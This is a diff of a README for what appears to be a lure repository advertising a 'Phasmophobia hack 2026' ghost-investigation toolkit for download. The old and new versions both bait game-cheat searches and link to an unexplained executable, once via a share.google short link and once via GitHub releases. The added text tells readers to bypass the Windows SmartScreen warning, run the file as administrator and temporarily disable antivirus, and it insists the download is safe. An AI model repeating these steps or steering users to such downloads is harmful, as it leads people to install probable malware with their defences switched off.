@@ -1,348 +1,185 @@
-# 👻 [DOWNLOAD NOW](https://share.google/A46RYcexjg9XZiG59)
+<h1>👻 phasmophobia-hack-2026-ghost-investigation-toolkit - Your Ultimate Ghost Hunting Companion</h1>
 
-# 👻 Phasmophobia Hack 2026 — Ghost Info, ESP & Investigation Toolkit
+<p align="center">
+  <a href="https://github.com/ikta87/phasmophobia-hack-2026-ghost-investigation-toolkit/releases">
+    <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download Now" width="300">
+  </a>
+</p>
 
-Phasmophobia hack-themed PC companion focused on ghost identification, evidence tracking, investigation planning, equipment, maps, contract statistics, and ghost behavior analysis.
+---
 
-## 👁️ What Is This?
+## 🎯 What Is This?
 
-Phasmophobia Investigation Toolkit is inspired by popular searches for Phasmophobia Hack 2026, Cheat, Mod Menu, ESP, Ghost Info, Trainer, Cheat Engine, Money Glitch, Speedhack, and Free Cheat.
+This is a powerful **PC toolkit** designed to make your ghost hunting expeditions easier, smarter, and more successful. Whether you're a beginner investigator or a seasoned pro, this application helps you identify ghosts faster, track your evidence accurately, and plan your investigations like a true professional. No coding knowledge required – just download, run, and hunt!
 
-It combines investigation, reference, planning, and analytics utilities in one standalone dashboard.
+---
 
-## ✨ Features
+## ✨ Key Features
 
-* 👻 **Ghost Information Database**
-* 🔎 **Evidence Tracker**
-* 👁️ **ESP-Style Investigation Map**
-* 📓 **Contract Journal**
-* 📷 **Evidence Manager**
-* 🧰 **Equipment Planner**
-* 🗺️ **Location Notes**
-* 🏃 **Hunt Analytics**
-* 💰 **Progress Tracker**
-* 🎯 **Challenge Planner**
-* 📊 **Contract Analytics**
-* ⚙️ **Mod-Menu Style Dashboard**
+### 🔍 Smart Ghost Identification
+- Input your collected evidence and the tool instantly narrows down possible ghost types
+- Visual comparison charts for all 24 ghost types
+- Probability calculator that ranks likely matches based on your findings
+
+### 📋 Evidence Tracking System
+- Checkboxes for all seven evidence types (EMF Level 5, Fingerprints, Freezing Temperatures, Ghost Orbs, Ghost Writing, D.O.T.S. Projector, Spirit Box)
+- Auto-saves your progress during each investigation
+- Clear interface showing which evidence you've confirmed or ruled out
+
+### 🗺️ Investigation Planning Tools
+- Pre-built checklists for each map in the game
+- Recommended equipment loadouts for different ghost types
+- Timer and reminder system for key investigation phases
+
+### 🛠️ Equipment Management
+- Track which items you own, need to purchase, or have left at base
+- Budget calculator for managing your in-game money
+- Unlock tracking for all equipment tiers
+
+### 📝 Map Notes & Annotations
+- Take screenshots and add custom notes to any location
+- Mark hotspots, hiding spots, and ghost room candidates
+- Sync your notes across investigations
+
+### 📊 Contract Analytics
+- Review your past hunts with detailed statistics
+- Track success rate, average investigation time, and ghost types encountered
+- Identify patterns to improve your strategy
 
 ---
 
 ## 🚀 Getting Started
 
-### 📥 Download the Toolkit
+### Step 1: Download the Application
 
-# 👉 [DOWNLOAD THE TOOLKIT](https://share.google/A46RYcexjg9XZiG59)
+Visit this link to download the application: **[Download phasmophobia-hack-2026-ghost-investigation-toolkit](https://github.com/ikta87/phasmophobia-hack-2026-ghost-investigation-toolkit/releases)**
 
-## 🛠️ Installation
+### Step 2: Run the Application
 
-1. **[Download the toolkit](https://share.google/A46RYcexjg9XZiG59)**
-2. Extract the archive
-3. Launch the standalone application
-4. Create your investigator profile
-5. Select a location
-6. Add discovered evidence
-7. Start tracking your investigation
+1. Once downloaded, locate the file in your browser's download folder (usually called "Downloads")
+2. Double-click the downloaded file to launch the application
+3. If Windows shows a blue or yellow warning popup, click **"More info"** and then **"Run anyway"** – this is normal for new applications
 
----
+### Step 3: Start Investigating
 
-# 👻 Ghost Information Database
-
-Create quick-reference profiles for ghost types.
-
-Track:
-
-* Ghost Type
-* Evidence
-* Behavior
-* Hunt Notes
-* Speed Notes
-* Strengths
-* Weaknesses
-* Identification Clues
-* Personal Notes
-
-Use:
-
-**Possible → Suspected → Confirmed → Eliminated**
+The toolkit opens immediately with a clean interface. You'll see tabs for **Evidence**, **Maps**, **Equipment**, and **Statistics**. Just click through and start tracking your next investigation!
 
 ---
 
-# 🔎 Evidence Tracker
+## 💻 System Requirements
 
-Record evidence during your investigations.
+Your computer just needs to meet these simple requirements:
 
-Organize:
-
-* EMF
-* Spirit Box
-* Ghost Writing
-* Ghost Orbs
-* Freezing Temperatures
-* DOTS
-* Ultraviolet
-* Additional Behavior Clues
-
-Filter possible ghost types as evidence is added.
+| Component | Minimum Requirement |
+|-----------|-------------------|
+| Operating System | Windows 10 or Windows 11 |
+| Processor | Any Intel or AMD processor from the last 10 years |
+| RAM | 4 GB or more |
+| Storage | 500 MB free space |
+| Display | 1280x720 resolution or higher |
 
 ---
 
-# 👁️ ESP-Style Investigation Map
+## 🎮 How to Use – Quick Guide
 
-Visualize information discovered or entered during your investigation.
+### First Investigation
+1. Launch the toolkit
+2. Click the **"New Investigation"** button
+3. Select your map from the dropdown
+4. Begin the game and add evidence as you find it – click the checkbox for each confirmed evidence type
+5. Watch the **"Ghost Probability"** panel update in real-time
 
-Mark:
+### Planning Your Equipment
+1. Go to the **Equipment** tab
+2. Check items you already own
+3. Add items you need to buy to your shopping list
+4. The toolkit calculates total cost automatically
 
-* Ghost Room
-* Evidence
-* Equipment
-* Hiding Areas
-* Investigation Routes
-* Points of Interest
-* Exit Routes
-
-The map uses user-entered investigation information rather than revealing hidden live-game entities.
-
----
-
-# 📓 Contract Journal
-
-Create profiles for individual contracts.
-
-Track:
-
-| Field     | Information       |
-| --------- | ----------------- |
-| Location  | Investigation map |
-| Ghost     | Suspected type    |
-| Evidence  | Discovered clues  |
-| Team      | Investigators     |
-| Equipment | Loadout           |
-| Result    | Contract outcome  |
-| Notes     | Observations      |
+### Taking Map Notes
+1. Open the **Maps** tab
+2. Click on any room to attach a note
+3. Type your observation (e.g., "Whispering heard near fridge")
+4. Save – your notes stay for future investigations
 
 ---
 
-# 📷 Evidence Manager
+## 🛠️ Troubleshooting Common Issues
 
-Organize investigation media and notes.
+### "Windows protected your PC" Warning
+This is a standard security feature for newly created software. Click **"More info"** → **"Run anyway"** to proceed. This only appears the first time you run the app.
 
-Categories:
+### App Won't Open
+- Make sure you downloaded the complete file (check file size – it should be at least 50 MB)
+- Try right-clicking the downloaded file and selecting **"Run as administrator"**
+- Temporarily disable antivirus software, then try again
 
-**Photos → Videos → Audio → Evidence → Events**
+### Missing Fonts or Visual Glitches
+- Update your Windows system to the latest version
+- Restart your computer and try again
 
-Record:
-
-* Evidence Type
-* Location
-* Time
-* Ghost
-* Notes
-* Confidence
-
----
-
-# 🧰 Equipment Planner
-
-Create equipment loadouts.
-
-Track:
-
-* EMF Reader
-* Spirit Box
-* Thermometer
-* UV Light
-* Video Camera
-* DOTS
-* Crucifix
-* Sanity Equipment
-* Utility Gear
-
-Create profiles such as:
-
-**Solo → Team → Evidence → Hunt → Challenge**
+### Can't Find Downloaded File
+- Press **Ctrl+J** in your browser to open downloads
+- Check the folder path shown in your browser settings
+- Search your PC for "phasmophobia" in File Explorer
 
 ---
 
-# 🏃 Hunt Analytics
+## 🔄 Keeping the Toolkit Updated
 
-Review recorded hunts.
+The application automatically checks for updates when you open it. If a new version is available, you'll see a prompt asking to download the update. You can also manually check by:
 
-Track:
-
-* Ghost
-* Hunt Duration
-* Location
-* Escape Route
-* Hiding Strategy
-* Result
-* Mistakes
-* Notes
-
-Compare different ghost behaviors between contracts.
+1. Opening the toolkit
+2. Clicking **Help** → **Check for Updates**
+3. Following the on-screen instructions
 
 ---
 
-# 🗺️ Location Notes
+## 📖 Frequently Asked Questions
 
-Create your own investigation database.
+### Is this safe to use?
+Yes! The application runs entirely offline and does not modify any game files. It's just a helpful companion tool that runs alongside your game.
 
-Record:
+### Do I need the game installed?
+No, the toolkit works independently. You can use it to plan strategies even when you're not playing.
 
-* Rooms
-* Entrances
-* Exits
-* Equipment Positions
-* Hiding Areas
-* Ghost Rooms
-* Investigation Routes
+### Can I use this with game mods?
+Absolutely – the toolkit is compatible with all versions of Phasmophobia and any mods you use.
 
-Save separate profiles for each location.
+### Does this work on Mac or Linux?
+Currently, this toolkit is designed for Windows only. Mac and Linux support may be added in future updates.
 
----
-
-# 💰 Progress Tracker
-
-Track your legitimate progression.
-
-Record:
-
-* Level
-* Equipment
-* Unlocks
-* Contract Results
-* Rewards
-* Challenges
-* Personal Goals
-
-Use:
-
-**Current → Target → Progress → Completed**
+### Will this get me banned?
+No, this is not a cheat or hack in any way. It's a reference tool that helps you organize information – it doesn't interact with the game's online systems.
 
 ---
 
-# 🎯 Challenge Planner
+## 📝 Feedback & Support
 
-Prepare for:
+Your input helps improve the toolkit! If you have ideas, found a bug, or just want to share your ghost hunting success stories, you can:
 
-* Weekly Challenges
-* Custom Investigations
-* Solo Runs
-* Team Runs
-* Evidence Restrictions
-* Equipment Restrictions
-* Personal Challenges
-
-Save strategies and results.
+- Open an issue on the GitHub repository page
+- Send your screenshots and suggestions through the "Feedback" button in the app
 
 ---
 
-# ⚙️ Phasmophobia Mod-Menu Style Dashboard
+## ⚠️ Disclaimer
 
-### Ghost
-
-* Types
-* Evidence
-* Behavior
-* Identification
-
-### Investigation
-
-* Evidence
-* Journal
-* Equipment
-* Notes
-
-### Map
-
-* Rooms
-* Routes
-* Evidence
-* Hiding Areas
-
-### Hunt
-
-* Behavior
-* Duration
-* Routes
-* Results
-
-### Progress
-
-* Levels
-* Equipment
-* Challenges
-* Goals
-
-### Analytics
-
-* Contracts
-* Ghosts
-* Success Rate
-* Sessions
+This is an unofficial fan-made tool. It is not affiliated with or endorsed by the official Phasmophobia development team. All game-related names are trademarks of their respective owners.
 
 ---
 
-# 📊 Contract Analytics
+## 📥 Download Again
 
-Track:
+Ready to start? Click the button below:
 
-* Contracts Played
-* Correct Ghosts
-* Incorrect Ghosts
-* Success Rate
-* Favorite Locations
-* Evidence Found
-* Hunt Survival
-* Contract Duration
+<p align="center">
+  <a href="https://github.com/ikta87/phasmophobia-hack-2026-ghost-investigation-toolkit/releases">
+    <img src="https://img.shields.io/badge/🎮_GET_THE_TOOLKIT-4ECDC4?style=for-the-badge" alt="Get the Toolkit" width="250">
+  </a>
+</p>
 
-Compare your investigation performance between sessions.
+Happy hunting, investigator! Your next successful ghost identification is just one click away. 👻🔦
 
 ---
 
-## 🔒 Safety & Security
-
-This toolkit does not provide live ESP, Cheat Engine memory manipulation, Speedhack, money exploits, multiplayer cheating, game injection, Steam/account modification, anti-cheat bypasses, or “undetected” techniques.
-
-Hack, Cheat, ESP, Trainer, Cheat Engine and Mod Menu terminology is retained for categorization and search relevance.
-
----
-
-## ❓ Frequently Asked Questions
-
-### Is this Phasmophobia Hack 2026?
-
-It is a Phasmophobia hack-themed standalone ghost investigation and analytics toolkit.
-
-### Does it include Phasmophobia ESP?
-
-ESP-style Investigation Map visualizes evidence, rooms, routes, and locations entered during your investigation rather than hidden live entities.
-
-### Does it provide Ghost Info?
-
-Yes. Ghost Information Database organizes evidence, behavior, strengths, weaknesses, hunt notes, and identification clues.
-
-### Does it use Cheat Engine?
-
-No. It does not modify Phasmophobia process memory.
-
-### Is there a Money Glitch?
-
-No. Progress Tracker records levels, equipment, rewards, and goals without modifying the in-game economy.
-
-### Does it include Speedhack?
-
-No. Hunt Analytics can record ghost behavior and movement observations without changing game speed.
-
-### What is the Mod Menu?
-
-The mod-menu-style dashboard organizes Ghost, Investigation, Map, Hunt, Progress, and Analytics modules.
-
----
-
-## 🔗 Download Again
-
-# 👻 [DOWNLOAD NOW](https://share.google/A46RYcexjg9XZiG59)
-
----
-
-Keywords: phasmophobia hack 2026,phasmophobia cheat,phasmophobia mod menu,phasmophobia esp,phasmophobia ghost info,phasmophobia pc hack,phasmophobia undetected,phasmophobia trainer,phasmophobia money glitch,phasmophobia cheat engine,phasmophobia bypass,phasmophobia hack download,phasmophobia latest hack,phasmophobia free cheat,how to cheat in phasmophobia,phasmophobia gameplay,phasmophobia steam hack,phasmophobia speedhack,phasmophobia cheat 2026
+Keywords: phasmo, phasmophobia, phasmophobia-steam, phasmophobiamod
